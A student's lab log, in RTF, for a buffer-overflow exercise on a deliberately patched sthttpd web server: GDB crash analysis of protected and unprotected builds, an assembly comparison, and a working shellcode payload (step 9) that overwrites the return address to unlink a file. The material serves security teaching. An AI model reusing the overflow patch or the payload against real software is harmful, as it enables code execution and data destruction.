{\rtf1\ansi\ansicpg1252\cocoartf1504\cocoasubrtf830
{\fonttbl\f0\fmodern\fcharset0 Courier;\f1\fmodern\fcharset0 Courier-Bold;\f2\fnil\fcharset0 Menlo-Regular;
}
{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red255\green255\blue255;\red0\green0\blue0;
\red255\green255\blue255;\red255\green255\blue255;\red71\green71\blue71;\red27\green31\blue34;}
{\*\expandedcolortbl;;\csgenericrgb\c0\c0\c0;\csgenericrgb\c100000\c100000\c100000;\csgray\c0;
\csgray\c100000;\cssrgb\c100000\c100000\c100000;\cssrgb\c34902\c34902\c34902;\cssrgb\c14118\c16078\c18039;}
\margl1440\margr1440\vieww17780\viewh13200\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 1.  \expnd0\expndtw0\kerning0
Make sure that /usr/local/cs/bin is at the start of your PATH; the command which gcc should output "/usr/local/cs/bin/gcc".\
	Mine was not. In order to get right PATH, I ran: \
	$ \kerning1\expnd0\expndtw0 PATH=/usr/local/cs/bin:$PATH; export PATH\
	Then after running  \
	$ which gcc\
	I got the output \expnd0\expndtw0\kerning0
/usr/local/cs/bin/gcc.\
\
2. Build sthttpd with this patch applied\
	In thttpd.c:\
		I changed char line[1000] to char line[100] and\
		while ( fgets( line, sizeof(line), fp ) != (char*) 0 ) to while ( fgets( line, 1000, fp ) != (char*) 0 )\
	In libhttpd.c:	\
		I changed (void) strcpy( str, &str[7] ); to (void) memmove( str, &str[7], strlen (&str[7]) + 1 );	\
	In \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 src directory, I ran \
	$ \cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 ./configure \\\
\pard\pardeftab720\partightenfactor0
\cf0    		LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"\
	Then, in sthttpd-2.27.0 directory, \
	\'85compilation\'85\
	\'853 times each\'85\
	SP: \
		$ make clean\
		$ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'\
		$ mv src/thttpd src/thttpd-sp\
	AS: \
		$ make clean \
		$ make CFLAGS='-g3 -O2 -fno-inline -static-libasan -fsanitize=address'\
		$ mv src/thttpd src/thttpd-as\
	NO: \
		$ make clean \
		$ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'\
		$ mv src/thttpd src/thttpd-no\
\
	$ make clean //for good measure\
\
3. Run each of the modified sthttpd daemons under GDB\
	\'85calculations of port based on previous compiler options\'85\
	formula: (12330 + 3 * (X % 293) + Y), X = 804794484 (my UID), \
			Y = 1, if SP\
			Y = 2, if AS\
			Y = 3, if NO \
	SP: \
		(12330 + 3 * (804794484 % 293) + 1) == \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 13081\
	AS: \
\cf0 \expnd0\expndtw0\kerning0
\CocoaLigature1 		(12330 + 3 * (804794484 % 293) + 2) == \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 13082\
	NO: \cf0 \expnd0\expndtw0\kerning0
\CocoaLigature1 \
		(12330 + 3 * (804794484 % 293) + 3) == \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 13083\
\
	Then, I ran commands to run each compiler options: \
	$ \cb3 src/thttpd-sp -p 13081 -D\
		in separate window:\
		$ ps -u classesh\
			>> \cf4 \cb5 45805 pts/27   00:00:00 thttpd-sp\cf2 \cb3 \
	$ src/thttpd-as -p 13082 -D\
		in separate window:\
		$ ps -u classesh\
			>> \cf4 \cb5 6123 pts/27   00:00:00 thttpd-as\cf2 \cb3 \
	$ src/thttpd-no -p 13083 -D\
		in separate window:\
		$ ps -u classesh\
			>> \cf4 \cb5 6277 pts/27   00:00:00 thttpd-no\cf2 \cb3 \
	The program hung, so I opened a new terminal window in SEAS server and entered ps -u classesh to confirm the program runs. \
\pard\pardeftab720\partightenfactor0

\f1\b \cf2 \cb1 \
\pard\pardeftab720\partightenfactor0

\f0\b0 \cf2 4. Verify \cf0 \expnd0\expndtw0\kerning0
\CocoaLigature1 that your web servers work in the normal case
\f1\b \cf2 \kerning1\expnd0\expndtw0 \CocoaLigature0 \

\f0\b0 \cf0 \expnd0\expndtw0\kerning0
\CocoaLigature1 	To create foo.txt: \
	\cf2 \cb6 $ echo 'The server is running.' > foo.txt\cf7 \
\cf0 \cb1 	\
	Then, ran these to test web servers: \
	$ src/thttpd-sp -p \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 13081\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1  -D\
	$ curl http://localhost:12589/foo.txt \
		>> \cf2 \cb6 The server is running \cf0 \cb1 \
		\
	$ src/thttpd-as -p \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 13082\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1  -D\
	$ curl http://localhost:12590/foo.txt\
		>> \cf2 \cb6 The server is running \cf0 \cb1 \
\
	$ src/thttpd-no -p \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 13083\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1  -D\
	$ curl http://localhost:12591/foo.txt\
		>> \cf2 \cb6 The server is running \
\
	To kill the running servers: \
	$ kill [pid]\
\
5. \cf0 \cb1 Make variant SP crash by invoking it in a suitable way. Run it under GDB, and get a backtrace immediately after the crash. Identify which machine instruction caused the crash, and why.\
	Because of step 2, we can make a line longer than 100 characters in a file to make the program crash. I did this and named it test.txt.\
	$ gdb thttpd-sp\
	(gdb) r -p \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 13081\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1  -D -C test.txt\
		>> \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 *** stack smashing detected ***: /w/home.07/class/classesh/sthttpd-2.27.0/src/thttpd-sp terminated\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 \
		Hence, smashing lab! Yay! \
	Backtrace:\
	(gdb) bt\
		>> \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 #0  0x00007ffff760e1f7 in raise () from /lib64/libc.so.6\
\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
\cf2 			 #1  0x00007ffff760f8e8 in abort () from /lib64/libc.so.6\
			 #2  0x00007ffff764df47 in __libc_message () from /lib64/libc.so.6\
			 #3  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6\
			 #4  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6\
			 #5  0x0000000000404edd in read_config (filename=<optimized out>)\
    				at thttpd.c:1191\
			 #6  0x00000000004052cf in parse_args (argc=6, argv=argv@entry=0x7fffffffe218)\
    				at thttpd.c:893\
			 #7  0x0000000000403826 in main (argc=<optimized out>, argv=0x7fffffffe218)\
    				at thttpd.c:380\
		\
		#4 is a stack check failure. #5 indicates that it comes from read_config, the function we messed with! \
		We check it out using gdb, setting a breakpoint at line 1191 as indicated by #5. \
	(gdb) break 1191\
	(gdb) set disassemble-next-line on\
	(gdb) r -p 13081\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1  -D -C test.txt\
			\'85si\'85\
			404e10 <read_config+1120>: 48 8b 44 24 68  mov    0x68(%rsp),%rax\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 \
\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 					CANARY into rax!\
			404e15 <read_config+1125> 64 48 33 04 25 28 00 00 00 xor    %fs:0x28,%rax\
					compare canary to old value\
			404e1e <read_config+1134>: 0f 85 b4 00 00 00 jne    0x404ed8 <read_config+1320>\
					if not equal, jumps to 0x
\f1\b 404ed8
\f0\b0 \
			\'85si\'85\
			
\f1\b 404ed8
\f0\b0  <read_config+1320>: e8 a3 d5 ff ff callq  0x402480 <__stack_chk_fail@plt>\
					canary was not the same value as before, so __stack_chk_fail is called, and aborts. \
6. Make variant AS crash by invoking it in a similar way. Similarly, get a backtrace for it, and identify the machine instruction that crashed it and wy.\
	$ gdb thttpd-as \
	(gdb) r -p 13082 -D -C test.txt\
		>> \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 ==31020==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcdb4 at pc 0x000000441de4 			bp 0x7fffffffcd10 sp 0x7fffffffc4c0\
	Backtrace:\
	(gdb) bt\
			#0  7ffff7073118 in ?? () from /lib64/libgcc_s.so.1\
			#1  7ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1\
			#2  4d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack (\
   				 this=0x7fffffffafc0, pc=4464100, max_depth=<optimized out>)\
   				 at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123\
			#3  419d7f in GetStackTraceWithPcBpAndContext (fast=false, \
    			context=0x0, bp=140737488342288, pc=4464100, max_depth=256, \
    			stack=0x7fffffffafc0)\
    			at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50\
			#4  __asan::ErrorGeneric::Print (\
    				this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>)\
   				 at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482\
			#5  ccae8 in Print (\
    			this=0x980140 <__asan::ScopedInErrorReport::current_error_>)\
    			at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360\
			#6  ~ScopedInErrorReport (this=0x7fffffffb837, __in_chrg=<optimized out>)\
  				  at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167\
			#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342288, \
  				  sp=sp@entry=140737488340160, addr=addr@entry=140737488342452, \
   				 is_write=is_write@entry=false, access_size=access_size@entry=426, exp=0, \
   				 fatal=false) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397\
			#8  441e03 in __interceptor_strchr (s=<optimized out>, at ../../../../gcc-7.2.0/				libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 \
\cf2 \cb3 			\kerning1\expnd0\expndtw0 \CocoaLigature0 #9  0x00000000004feb58 in read_config (filename=<optimized out>)\
    				at 
\f1\b thttpd.c:1019
\f0\b0 \
			#10 0x6161616161616161 in ?? ()\
			#11 0x6161616161616161 in ?? ()\
			#12 0x6161616161616161 in ?? ()\
			#13 0x6161616161616161 in ?? ()\
			#14 0x6161616161616161 in ?? ()\
			#15 0x6161616161616161 in ?? ()\
			#16 0x6161616161616161 in ?? ()\
			#17 0x6161616161616161 in ?? ()\
			#18 0x6161616161616161 in ?? ()\
			#19 0x6161616161616161 in ?? ()\
			#20 0x6161616161616161 in ?? ()\
			#21 0x6161616161616161 in ?? ()\
			#22 0x6161616161616161 in ?? ()\
			#23 0x6161616161616161 in ?? ()\
			#24 0x6161616161616161 in ?? ()\
			#25 0x6161616161616161 in ?? ()\
			#26 0x6161616161616161 in ?? ()\
			#27 0x6161616161616161 in ?? ()\
\
			So, #0 and #9 look suspect. #0 seems to indicate that a value has been overwritten. \
			#9 points to the line where things go wrong, line 1019 in file thttpd.c. Again, we check it out using 			GDB.\
	\
			(gdb) break 1018\
			 (\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 gdb) r -p 13082 -D -C test.txt\
\pard\pardeftab720\partightenfactor0
\cf0 			(gdb) set disassemble-next-line on \
			\'85si\'85\
			0x00000000004feb53 <read_config+179>:	e8 f8 34 f4 ff	callq  0x442050 <__interceptor_strchr(char const*, int)>\
			The function call to __interceptor_strchr(char const*, int) indicates address sanitizer will abort the program due to the the signal of overflow. \
\
7. Likewise for variant NO. \
	$ gdb thttpd-no\
	\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 (\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 gdb) r -p 13083 -D -C test.txt\
	>>\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 Program received signal SIGSEGV, Segmentation fault.\
\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
\cf2 0x0000000000404c8c in read_config (filename=<optimized out>) at 
\f1\b thttpd.c:1191
\f0\b0 \
1191	    \}\
	Backtrace:\
	(gdb) bt\
		#0  0x0000000000404c8c in read_config (filename=<optimized out>)\
    		at thttpd.c:1191\
		#1  0x6161616161616161 in ?? ()\
		#2  0x6161616161616161 in ?? ()\
		#3  0x6161616161616161 in ?? ()\
		#4  0x6161616161616161 in ?? ()\
		#5  0x6161616161616161 in ?? ()\
		#6  0x6161616161616161 in ?? ()\
		#7  0x6161616161616161 in ?? ()\
		#8  0x6161616161616161 in ?? ()\
		#9  0x6161616161616161 in ?? ()\
		#10 0x6161616161616161 in ?? ()\
		#11 0x6161616161616161 in ?? ()\
		#12 0x6161616161616161 in ?? ()\
		#13 0x6161616161616161 in ?? ()\
		#14 0x6161616161616161 in ?? ()\
		#15 0x6161616161616161 in ?? ()\
		#16 0x6161616161616161 in ?? ()\
		#17 0x6161616161616161 in ?? ()\
		#18 0x6161616161616161 in ?? ()\
		#19 0x6161616161616161 in ?? ()\
		#20 0x6161616161616161 in ?? ()\
		#21 0x6161616161616161 in ?? ()\
			In the error message we see line 1191, so we set breakpoint accordingly. \
	$ gdb thttpd-no\
	(gdb) break 1191\
	(gdb) r -p 13083 -D -C crash.txt\
	(gdb) set disassemble-next-line on \
	\'85si\'85\
		0x0000000000404c84 <read_config+1108>: 5b pop    %rbx\
   		0x0000000000404c85 <read_config+1109>: 5d pop    %rbp\
   		0x0000000000404c86 <read_config+1110>: 41 5c pop    %r12\
   		0x0000000000404c88 <read_config+1112>: 41 5d pop    %r13\
  		0x0000000000404c8a <read_config+1114>:41 5e pop    %r14\
=> 		0x0000000000404c8c <read_config+1116>: c3 retq   \
\
		Program terminated with signal SIGSEGV, Segmentation fault.\
		The program no longer exists.\
\
	Since we had no stack protection nor address sanitation, our test.txt file overwrote the return address on the 	program, thus causing a segmentation fault and essentially overwriting the existence of the program.\
	Therefore the machine instruction retq is there reason for this behavior since there is nothing to return to. \
\
8. \cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 Generate the assembly language code for thttpd.c three times, one for each variant, by using gcc -S rather than gcc -c -g3 when compiling the file. (Use the same -O and -f flags as before.) Call the resulting files src/thttpd-sp.s and src/thttpd-as.s and src/thttpd-no.s. Compare the three assembly-language files' implementations of the handle_read function. Describe the techniques used by -fstack-protector-strong and -fsanitize=address to prevent buffer-overrun exploits in handle_read.\
	SP:\
	 $ gcc -S -O2 -fno-inline -fstack-protector-strong -I .. -I . thttpd.c -o thttpd-sp.s\
\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 	 >> 
\f1\b thttpd.c:
\f0\b0  In function '
\f1\b main
\f0\b0 ':\

\f1\b 	thttpd.c:610:12:
\f0\b0  
\f1\b warning: 
\f0\b0 implicit declaration of function '
\f1\b sigset
\f0\b0 '; did you mean '
\f1\b sigvec
\f0\b0 '? [
\f1\b -Wimplicit-	function-declaration
\f0\b0 ]\
     (void) 
\f1\b sigset
\f0\b0 ( SIGTERM, handle_term );\
            
\f1\b ^~~~~~
\f0\b0 \
            sigvec\
	 $ make clean\
	AS: \
	 $ \cf8 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 gcc -S -O2 -fno-inline -static-libasan -fsanitize=address -I .. -I . thttpd.c -o thttpd-as.s\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 \
	>>
\f1\b thttpd.c:
\f0\b0  In function '
\f1\b main
\f0\b0 ':\

\f1\b 	thttpd.c:610:12:
\f0\b0  
\f1\b warning: 
\f0\b0 implicit declaration of function '
\f1\b sigset
\f0\b0 '; did you 	mean '
\f1\b sigvec
\f0\b0 '? [
\f1\b -Wimplicit-function-declaration
\f0\b0 ]\
     (void) 
\f1\b sigset
\f0\b0 ( SIGTERM, handle_term );\
            
\f1\b ^~~~~~
\f0\b0 \
            sigvec\
	 $ make clean\
	NO:\
	 $ \cf8 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 gcc -S -O2 -fno-inline -fno-stack-protector -zexecstack -I .. -I . thttpd.c -o thttpd-no.s\
\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 	>>	
\f1\b thttpd.c:
\f0\b0  In function '
\f1\b main
\f0\b0 ':\

\f1\b 	thttpd.c:610:12:
\f0\b0  
\f1\b warning: 
\f0\b0 implicit declaration of function '
\f1\b sigset
\f0\b0 '; did you mean '
\f1\b sigvec
\f0\b0 '? [
\f1\b -Wimplicit-	function-declaration
\f0\b0 ]\
     (void) 
\f1\b sigset
\f0\b0 ( SIGTERM, handle_term );\
            
\f1\b ^~~~~~
\f0\b0 \
            sigvec\
	$ make clean\
	\
	Let\'92s now take a look at the handle_read function. Between the SP and NO variants, there is no distinguishable difference in terms of how it deals with this respective function. Since SP checks for stack protection via canaries, and the handle_read requires no canary usability, there is no protection in regards to this function, thus being equivalent to the NO variant. However, AS assesses whether or not addresses are indeed valid addresses, calling 	\
		__asan_report_load4\
		__asan_report_load8\
		__asan_report_store8\
		which provides a real-time check such that the above will abort and notify the user of errors. \
\
9. \cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 Build an exploit for the bug in variant NO that relies on the attacker tricking the victim into invoking thttpd with a particular value for the -C option. (Admittedly this is not much of an exploit, but we don't want you to have to put more easily exploitable HTTP servers on our network.) Your exploit should cause the victim web server that is invoked via GDB with -C to remove the file target.txt in the working directory of the web server. Or, if such an exploit is impossible, explain why not, and investigate simple ways to alter the compiler flags (or, in the worst case, to insert plausible bugs into the source code) to make the exploit possible.\
	$ gdb thttpd-no\
	(gdb) r -p \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 13083\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1  -D -C test.txt\
	(gdb) print &line\
		>> \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 $1 = (char (*)[100]) 0x7fffffffceb0\
		In little endian,: b0ce ffff ff7f 0000
\f2\fs36 \

\f0\fs24 \cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 	(gdb) i r rsp\
	>>	\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 rsp            0x7fffffffcf48	0x7fffffffcf48\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 \
		This is the return address of read_config. \
		If we take the difference between the return address and the address of line, we get the size of buffer: \
			\cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 0x7fffffffcf48 - 0x7fffffffceb0  = 0x98\
			In decimal, this is 152. Our buffer is 152 bytes, thus we have to fill 152 bytes to overwrite the return 			address. \
\
	(gdb) disassemble /r unlink\
   	0x00007ffff76c3f70 <+0>:	b8 57 00 00 00	mov    $0x57,%eax\
   	0x00007ffff76c3f75 <+5>:	0f 05	syscall \
   	0x00007ffff76c3f77 <+7>:	48 3d 01 f0 ff ff cmp    $0xfffffffffffff001,%rax\
   	0x00007ffff76c3f7d <+13>:	73 01	jae    0x7ffff76c3f80 <unlink+16>\
   	0x00007ffff76c3f7f <+15>:	c3	retq   \
   	0x00007ffff76c3f80 <+16>:	48 8b 0d e1 0e 2d 00 mov    0x2d0ee1(%rip),%rcx        # 0x7ffff7994e68\
   	0x00007ffff76c3f87 <+23>:	f7 d8	neg    %eax\
   	0x00007ffff76c3f89 <+25>:	64 89 01	mov    %eax,%fs:(%rcx)\
   	0x00007ffff76c3f8c <+28>:	48 83 c8 ff	or     $0xffffffffffffffff,%rax\
   	0x00007ffff76c3f90 <+32>:	c3	retq\
\
		0x57\'85\
\
	$ vim locate.c\
	In locate.c (to get address of target.txt):\
		#include <stdio.h>\
		int main()\
		\{\
			char file() = \'93target.txt\'94; \
			return 0; \
		\}\
	gcc -g -c locate.c\
	objdump -d locate.o\
	0:	55                   	push   %rbp\
   	1:	48 89 e5             	mov    %rsp,%rbp\
   	4:	48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax\
    b:	74 2e 74 \
   	e:	48 89 45 f5          	mov    %rax,-0xb(%rbp)\
  	12:	66 c7 45 fd 78 74    	movw   $0x7478,-0x3(%rbp)\
  	18:	c6 45 ff 00          	movb   $0x0,-0x1(%rbp)\
  	1c:	b8 00 00 00 00       	mov    $0x0,%eax\
  	21:	5d                   	pop    %rbp\
  	22:	c3                   	retq \
\
	target.txt address (in little endian): 74 61 72 67 65 74 2e 74 78 74 00. 11 bytes. \
	We can now store target.txt, which requires 16 bytes (rsp needs to be a multiple of 8). \
	0x7fffffffcf48 - 0x10 = 0x\expnd0\expndtw0\kerning0
\CocoaLigature1 7FFFFFFFCF38\
\cf0 \cb1 	\
	To exploit, we need to unlink the system call manually with assembly code. \
	$ \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 vim unlink.s\expnd0\expndtw0\kerning0
\CocoaLigature1 \
	$ \kerning1\expnd0\expndtw0 \CocoaLigature0 gcc -c unlink.s\
	$ objdump -d unlink.o\expnd0\expndtw0\kerning0
\CocoaLigature1 \
\kerning1\expnd0\expndtw0 \CocoaLigature0 	0:	48 bf 38 cf ff ff ff 	movabs $0x7fffffffcf38,%rdi\
   	7:	7f 00 00 \
   	a:	48 c7 c0 57 00 00 00 	mov    $0x57,%rax\
  	11:	0f 05                	syscall\
\
	$ vim dir.txt\
	In dir.txt: \
		dir=\
	$ xxd dir.txt\
	>> 0000000: 6469 723d 0a\
\
\
\
	$ vim hexExploit.txt\
	In hexExploit.txt: \
	\'85amalgamate the data we\'92ve collected and represent in hex\'85\
	0000000: 6469 723d 0a00 0000 48bf 38cf ffff ff7f\
	0000010: 0000 48c7 c057 0000 000f 0500 0000 0000\
	0000020: 0000 0000 0000 0000 0000 0000 0000 0000\
	0000030: 0000 0000 0000 0000 0000 0000 0000 0000\
	0000040: 0000 0000 0000 0000 0000 0000 0000 0000\
	0000050: 0000 0000 0000 0000 0000 0000 0000 0000\
	0000060: 0000 0000 0000 0000 0000 0000 0000 0000\
	0000070: 0000 0000 0000 0000 0000 0000 0000 0000\
	0000080: 0000 0000 0000 0000 7461 7267 6572 2e74\
	0000090: 7874 0000 0000 0000 b0ce ffff ff7f 0000\
\
	\'85move into file that will hold raw representation\'85\
	$ xxd -r hexExploit.txt raw.txt\
	\
	(gdb) r -p 13083 -D -C raw.txt\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 \
	>> \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 [Thread debugging using libthread_db enabled]\
	   Using host libthread_db library "/lib64/libthread_db.so.1".\
\
		Program received signal SIGSEGV, Segmentation fault.\
		0x000000000000007f in ?? ()\cf0 \cb1 \expnd0\expndtw0\kerning0
\CocoaLigature1 \
\
\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0

\fs26 \cf2 \cb3 \kerning1\expnd0\expndtw0 \CocoaLigature0 	$ ls target.txt\
		>> ls: cannot access 'target.txt': No such file or directory\
\
	EXPLOIT CODE WORKS!\
\
 }